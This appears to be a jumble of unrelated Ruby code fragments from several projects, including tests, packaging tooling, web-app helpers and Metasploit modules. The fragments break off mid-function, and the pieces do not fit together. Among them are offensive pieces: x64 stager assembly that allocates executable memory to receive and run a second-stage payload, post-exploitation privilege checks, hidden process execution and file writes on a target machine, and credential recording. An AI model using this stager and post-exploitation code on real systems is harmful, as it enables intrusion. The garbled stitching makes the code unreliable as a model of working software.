
        
        describe JobsHelper do
  let(:job) { Delayed::Job.new }
    
        it 'should raise an exception when encountering complex JSONPaths' do
      expect { LiquidMigrator.convert_string('Received <$.content.text.*> from <$.content.name> .') }.
        to raise_error('JSONPath '$.content.text.*' is too complex, please check your migration.')
    end
  end
    
        @checker = Agents::AftershipAgent.new(:name => 'tectonic', :options => @opts)
    @checker.user = users(:bob)
    @checker.save!
  end
    
      def get_privs
    if client.sys.config.is_system?
      print_good('Running as SYSTEM')
    else
      print_warning('Not currently running as SYSTEM')
      print_status('Attempting to getprivs ...')
      privs = client.sys.config.getprivs
    
        # Some of the shenanigans above could have appended a dot, which will
    # cause a syntax error.  Remove any trailing dots.
    b64.chomp!('.')
    
          ; Alloc a RWX buffer for the second stage
        pop rsi                 ; pop off the second stage length
        mov esi, esi            ; only use the lower-order 32 bits for the size
        xor esi, #{xorkey}    ; XOR the stage length
        lea r11, [rsi+0x100]  ; R11 = stage length + S-box length (alloc length)
        push 0x40               ;
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ;
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx,rcx             ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        ; mov rbx, rax            ; rbx = our new memory address for the new stage
        lea rbx, [rax+0x100]
        ; mov r15, rax            ; save the address so we can jump into it later
        mov r15, rbx
	push rbx              ; save stage address
        push rsi              ; push stage length
        push rax              ; push the address of the S-box
    
      # Store a UUID URL in the database if tracking is enabled
  def record_payload_uuid_url(uuid, url)
    return unless datastore['PayloadUUIDTracking']
    # skip if there is no active database
    return if !(framework.db && framework.db.active)
    
        begin
      write_file('#{tmp_dir}\\interface.html', interface)
      write_file('#{tmp_dir}\\api.js', api)
    rescue RuntimeError => e
      elog('webcam_chat failed. #{e.class} #{e}')
      raise 'Unable to initialize the interface on the target machine'
    end
    
        create_credential_login(login_data)
  end
    
        # Run the result
    if datastore['RUN_BINARY']
      cmd_out = session.sys.process.execute(net_com_opts[:target].gsub('\\', '\\\\'),
                                            nil, 'Hidden' => true, 'Channelized' => true)
      while (out = cmd_out.channel.read)
        print_good out
      end
    end
    
          <ul id='backtrace-ul'>
    
    begin
  require 'bundler'
  Bundler::GemHelper.install_tasks
rescue LoadError => e
  $stderr.puts e
end
    
          NO_ARG_DIRECTIVES = %i(block_all_mixed_content disown_opener
                             upgrade_insecure_requests).freeze
    
    begin
  require 'escape_utils'
rescue LoadError
end
    
      it 'accepts post form requests with masked authenticity_token field' do
    post('/', {'authenticity_token' => masked_token}, 'rack.session' => session)
    expect(last_response).to be_ok
  end
    
      it 'renders a user's story successfully' do
    expect(get: '/ben/this-is-a-slug').to route_to(
      controller: 'stories',
      action: 'show',
      slug: 'this-is-a-slug',
      username: 'ben',
    )
  end
    
      def self.send_to_buffer(text, buffer_profile_id_code)
    client = Buffer::Client.new(ApplicationConfig['BUFFER_ACCESS_TOKEN'])
    client.create_update(
      body: {
        text:
        text,
        profile_ids: [
          buffer_profile_id_code,
        ]
      },
    )
  end
    
      def destroy
    @page = Page.find(params[:id])
    @page.destroy
    redirect_to '/internal/pages'
  end
    
      it 'should package Digest::MD5' do
    pending('Disabled on travis-ci because it always fails, and there is no way to debug it?') if is_travis
    
    # Add a script to run after install (should be in the current directory):
package.scripts[:after_install] = 'my_after_install_script.sh'
    
      # This class is raised when you try to output a package to a path
  # whose containing directory does not exist.
  class ParentDirectoryMissing < StandardError
    def to_s
      return 'Parent directory does not exist: #{File.dirname(super)} - cannot write to #{super}'
    end # def to_s
  end # class ParentDirectoryMissing
    
        # 'native' in apk should be 'noarch'
    if @architecture.nil? or @architecture == 'native'
      @architecture = 'noarch'
    end
    return @architecture
  end
    
      option '--package-name-prefix', 'PREFIX', 'Name to prefix the package ' \
    'name with.', :default => 'node'
    
      public(:input)
end # class FPM::Package::PleaseRun

    
        # easy_install will put stuff in @tmpdir/packagename/, so find that:
    #  @tmpdir/somepackage/setup.py
    dirs = ::Dir.glob(File.join(target, '*'))
    if dirs.length != 1
      raise 'Unexpected directory layout after easy_install. Maybe file a bug? The directory is #{build_path}'
    end
    return dirs.first
  end # def download